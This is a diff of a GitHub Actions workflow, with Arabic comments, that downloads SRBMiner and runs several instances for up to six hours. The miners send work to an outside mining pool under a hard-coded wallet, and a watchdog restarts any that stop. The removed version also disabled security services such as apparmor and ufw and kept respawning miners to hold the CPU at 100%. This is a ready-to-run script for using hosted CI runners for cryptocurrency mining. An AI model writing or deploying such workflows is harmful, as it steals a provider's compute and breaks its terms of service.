@@ -1,4 +1,4 @@
-name: Linux-Miner-Yescryptr16-CPU-100Percent
+name: Linux-Miner-Yescryptr16-MaxPerf
 
 on:
   workflow_dispatch:
@@ -9,294 +9,87 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: Ultimate System Optimization
+
+      - name: System Optimization
         run: |
           sudo apt update
-          sudo apt install -y wget tar cpulimit htop curl bc screen
-          
-          echo "💥 تطبيق تحسينات CPU المتطورة..."
-          
-          # تفعيل وضع الأداء القصوى
-          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
-          
-          # تحسين إعدادات الذاكرة والنظام
+          sudo apt install -y wget tar htop curl bc sysstat
+
+          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
           sudo sysctl -w vm.swappiness=1
           sudo sysctl -w vm.dirty_ratio=3
           sudo sysctl -w vm.dirty_background_ratio=1
           sudo sysctl -w vm.vfs_cache_pressure=50
-          sudo sysctl -w kernel.numa_balancing=0
-          
-          # تعطيل الخدمات غير الضرورية
-          sudo systemctl stop snapd systemd-resolved apparmor ufw motd-news chrony 2>/dev/null || true
-          sudo systemctl disable snapd systemd-resolved 2>/dev/null || true
-          
-          # تنظيف الذاكرة المؤقتة
+
           sync
           echo 3 | sudo tee /proc/sys/vm/drop_caches
 
-      - name: Download and Setup Miner
+      - name: Download SRBMiner
         run: |
           wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
-          mkdir -p miner
+          mkdir miner
           tar -xzf miner.tar.gz -C miner --strip-components=1
           chmod +x miner/SRBMiner-MULTI
 
-      - name: CPU Core Maximization
+      - name: Detect Cores
         run: |
-          TOTAL_CORES=$(nproc)
-          echo "🖥️ إجمالي الأنوية المتاحة: $TOTAL_CORES"
-          
-          # استخدام كل الأنوية بدون استثناء
-          THREADS=$TOTAL_CORES
-          echo "🎯 استخدام كل الأنوية: $THREADS"
+          THREADS=$(nproc)
           echo "THREADS=$THREADS" >> $GITHUB_ENV
+          echo "Detected $THREADS CPU cores."
 
-      - name: Launch 100% CPU Miner
+      - name: Start Miner
         run: |
           cd miner
-          
-          function launch_max_power_miner() {
-            echo "🚀 إطلاق الماينر بأقصى طاقة - 100% CPU..."
-            
-            # تشغيل متعدد للعمليات لضمان استخدام كامل للمعالج
-            for INSTANCE in {1..2}; do
-              nohup ./SRBMiner-MULTI \
-                -a yescryptr16 \
-                -o stratum+tcps://na.rplant.xyz:17057 \
-                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
-                --cpu-threads $THREADS \
-                --cpu-threads-priority 5 \
-                --cpu-affinity 0 \
-                --cpu-max-threads-hint 100 \
-                --keepalive \
-                --retries 999 \
-                --retry-pause 1 \
-                --timeout 0 \
-                --donate-level 0 \
-                --no-watchdog \
-                --no-color > /dev/null 2>&1 &
-                
-              MINER_PID=$!
-              echo "   🔥 نسخة الماينر $INSTANCE: PID $MINER_PID"
-              
-              # ضبط أولوية قصوى
-              renice -n -20 $MINER_PID
-              echo "   ✅ تم ضبط أولوية العملية: $MINER_PID"
-            done
-          }
-          
-          launch_max_power_miner
 
-      - name: CPU Pressure Booster
-        run: |
-          function cpu_booster() {
-            echo "⚡ بدء معزز ضغط CPU..."
-            
-            while true; do
-              # قياس استخدام CPU الحقيقي
-              CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
-              MINER_COUNT=$(pgrep -c SRBMiner || true)
-              
-              echo "📊 استخدام CPU: ${CPU_USAGE}% | عمليات الماينر: $MINER_COUNT"
-              
-              # إذا كان استخدام CPU أقل من 98%، نزيد الضغط
-              if (( $(echo "$CPU_USAGE < 98" | bc -l) )); then
-                echo "🔴 استخدام CPU منخفض ($CPU_USAGE%) - زيادة الضغط..."
-                
-                # تشغيل المزيد من عمليات الماينر
-                cd miner
-                nohup ./SRBMiner-MULTI \
-                  -a yescryptr16 \
-                  -o stratum+tcps://na.rplant.xyz:17057 \
-                  -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
-                  --cpu-threads $THREADS \
-                  --cpu-threads-priority 5 > /dev/null 2>&1 &
-                  
-                BOOST_PID=$!
-                renice -n -20 $BOOST_PID
-                echo "   💥 معزز إضافي: PID $BOOST_PID"
-              fi
-              
-              # إذا كان هناك عدد قليل من العمليات، نعيد تشغيلها
-              if [ $MINER_COUNT -lt 2 ]; then
-                echo "🔄 إعادة تشغيل عمليات الماينر..."
-                pkill -f SRBMiner 2>/dev/null || true
-                sleep 2
-                cd miner
-                for i in {1..2}; do
-                  nohup ./SRBMiner-MULTI -a yescryptr16 -o stratum+tcps://na.rplant.xyz:17057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v --cpu-threads $THREADS --cpu-threads-priority 5 > /dev/null 2>&1 &
-                done
-              fi
-              
-              # تنظيف الذاكرة كل 5 دقائق
-              if [ $(( $(date +%s) % 300 )) -eq 0 ]; then
-                sync
-                echo 1 | sudo tee /proc/sys/vm/drop_caches > /dev/null
-                echo "🧹 تنظيف ذاكرة مؤقتة..."
-              fi
-              
-              sleep 15
-            done
-          }
-          
-          cpu_booster &
-
-      - name: Core Load Balancer
-        run: |
-          function load_balancer() {
-            echo "⚖️ بدء موازن حمل الأنوية..."
-            
-            while true; do
-              # فحص استخدام كل نواة فردية
-              CORE_USAGE=$(mpstat -P ALL 1 1 2>/dev/null | awk '/Average:/ && $2 ~ /[0-9]/ {print $3}' || echo "100")
-              CORE_INDEX=0
-              LOW_LOAD_CORES=0
-              
-              for usage in $CORE_USAGE; do
-                if (( $(echo "$usage < 95" | bc -l) )); then
-                  ((LOW_LOAD_CORES++))
-                fi
-                ((CORE_INDEX++))
-              done
-              
-              if [ $LOW_LOAD_CORES -gt 2 ]; then
-                echo "⚠️  اكتشاف $LOW_LOAD_CORES أنوية بأداء منخفض"
-                echo "🔄 إعادة توزيع الحمل..."
-                
-                # إعادة تشغيل الماينر مع إعدادات محسنة
-                pkill -f SRBMiner
-                sleep 3
-                
-                cd miner
-                for i in {1..3}; do
-                  nohup ./SRBMiner-MULTI \
-                    -a yescryptr16 \
-                    -o stratum+tcps://na.rplant.xyz:17057 \
-                    -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
-                    --cpu-threads $THREADS \
-                    --cpu-threads-priority 5 \
-                    --cpu-affinity 0 \
-                    --cpu-max-threads-hint 100 > /dev/null 2>&1 &
-                done
-              fi
-              
-              sleep 45
-            done
-          }
-          
-          load_balancer &
-
-      - name: 5-Hour Maximum Pressure Session
-        run: |
-          MAX_SESSION=300  # 5 ساعات
-          echo "💥 بدء جلسة الضغط الأقصى: $MAX_SESSION دقيقة"
-          
-          for minute in $(seq 1 $MAX_SESSION); do
-            # تحديث الإحصائيات
-            if [ $((minute % 10)) -eq 0 ]; then
-              CPU_LOAD=$(cat /proc/loadavg | awk '{print $1}')
-              MINER_PROCESSES=$(pgrep -c SRBMiner || echo "0")
-              TOTAL_CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
-              
-              echo "📈 الدقيقة $minute:"
-              echo "   🔴 استخدام CPU: ${TOTAL_CPU}%"
-              echo "   🔥 عدد العمليات: $MINER_PROCESSES"
-              echo "   📊 حمل النظام: $CPU_LOAD"
-            fi
-            
-            # تعزيز دوري كل 20 دقيقة
-            if [ $((minute % 20)) -eq 0 ]; then
-              echo "🔋 تعزيز أداء دوري..."
-              cd miner
-              nohup ./SRBMiner-MULTI \
-                -a yescryptr16 \
-                -o stratum+tcps://na.rplant.xyz:17057 \
-                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
-                --cpu-threads $THREADS \
-                --cpu-threads-priority 5 > /dev/null 2>&1 &
-            fi
-            
-            # إعادة ضبط النظام كل ساعة
-            if [ $((minute % 60)) -eq 0 ]; then
-              echo "🔄 إعادة ضبط نظام دورية..."
-              echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
-              sync
-              echo 3 | sudo tee /proc/sys/vm/drop_caches
-            fi
-            
-            sleep 60
-          done
-
-      - name: Final Extreme CPU Overdrive
-        run: |
-          echo "🚀 بدء وضع Overdrive النهائي..."
-          
-          # إيقاف كل العمليات السابقة
-          pkill -f SRBMiner 2>/dev/null || true
-          sleep 5
-          
-          # تنظيف نظام نهائي
-          sync
-          echo 3 | sudo tee /proc/sys/vm/drop_caches
-          
-          # التشغيل النهائي بأقصى قوة
-          cd miner
-          echo "💥 التشغيل النهائي بـ $THREADS نواة بأقصى قوة..."
-          
-          # تشغيل 4 عمليات متزامنة للضغط القصوى
-          for i in {1..4}; do
+          # تشغيل 3 عمليات ماينر لتحقيق 100% CPU دائم
+          for i in 1 2 3; do
             nohup ./SRBMiner-MULTI \
               -a yescryptr16 \
               -o stratum+tcps://na.rplant.xyz:17057 \
               -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
               --cpu-threads $THREADS \
               --cpu-threads-priority 5 \
-              --cpu-affinity 0 \
-              --cpu-max-threads-hint 100 \
               --keepalive \
-              --retries 999 \
-              --donate-level 0 \
-              --no-watchdog > overdrive_$i.log 2>&1 &
-              
-            OVERDRIVE_PID=$!
-            renice -n -20 $OVERDRIVE_PID
-            echo "   💥 عملية Overdrive $i: PID $OVERDRIVE_PID"
+              --retry-pause 1 \
+              --donate-level 0 > miner_$i.log 2>&1 &
           done
-          
-          # مراقبة نهائية لمدة 55 دقيقة
-          FINAL_MINUTES=55
-          echo "⏳ التشغيل النهائي لمدة $FINAL_MINUTES دقيقة..."
-          
-          for i in $(seq 1 $FINAL_MINUTES); do
-            CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
-            LOAD_AVG=$(cat /proc/loadavg | awk '{print $1}')
-            echo "📊 الدقيقة $i/$FINAL_MINUTES - CPU: ${CPU_USAGE}% | الحمل: $LOAD_AVG"
-            
-            # تأكد من استمرار العمليات
-            MINER_COUNT=$(pgrep -c SRBMiner || echo "0")
-            if [ $MINER_COUNT -lt 3 ]; then
-              echo "🔄 إعادة تشغيل العمليات المفقودة..."
+
+      - name: 6 Hour Watchdog Loop
+        run: |
+          echo "Starting 6-hour watchdog..."
+
+          for minute in $(seq 1 360); do
+
+            MINERS=$(pgrep -c SRBMiner || echo 0)
+
+            # إذا ماتت عملية نعيد تشغيلها
+            if [ "$MINERS" -lt 3 ]; then
+              echo "Miner dropped, restarting missing instance..."
               cd miner
-              nohup ./SRBMiner-MULTI -a yescryptr16 -o stratum+tcps://na.rplant.xyz:17057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v --cpu-threads $THREADS --cpu-threads-priority 5 > /dev/null 2>&1 &
+              nohup ./SRBMiner-MULTI \
+                -a yescryptr16 \
+                -o stratum+tcps://na.rplant.xyz:17057 \
+                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
+                --cpu-threads $THREADS \
+                --cpu-threads-priority 5 \
+                --donate-level 0 > revive.log 2>&1 &
             fi
-            
+
+            # كل 10 دقائق اطبع الحالة
+            if [ $((minute % 10)) -eq 0 ]; then
+              CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
+              LOAD=$(cat /proc/loadavg | awk '{print $1}')
+              echo "[$minute/360] CPU: ${CPU}% | Load: $LOAD | Miners: $MINERS"
+            fi
+
             sleep 60
           done
 
-      - name: Final Performance Summary
+      - name: Final Summary
         if: always()
         run: |
-          echo "📊 تقرير الأداء النهائي:"
-          echo "========================"
-          echo "🖥️  مواصفات النظام:"
-          echo "   - المعالج: $(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2 | xargs)"
-          echo "   - الأنوية: $(nproc)"
-          echo "   - الذاكرة: $(free -h | grep Mem | awk '{print $2}')"
-          echo ""
-          echo "⚡ إحصائيات التشغيل:"
-          echo "   - أقصى خيوط مستخدمة: $THREADS"
-          echo "   - مدة التشغيل: 6 ساعات"
-          echo "   - وضع التشغيل: 100% CPU Load"
-          echo "   - عدد عمليات الماينر النهائية: $(pgrep -c SRBMiner || echo 0)"
-          echo ""
-          echo "✅ تم تحقيق ضغط CPU بنسبة 100% بنجاح"
+          echo "===== FINAL REPORT ====="
+          echo "CPU: $(nproc) cores"
+          echo "RAM: $(free -h | grep Mem | awk '{print $2}')"
+          echo "Miner processes: $(pgrep -c SRBMiner || echo 0)"
+          echo "Session Complete ✔️"
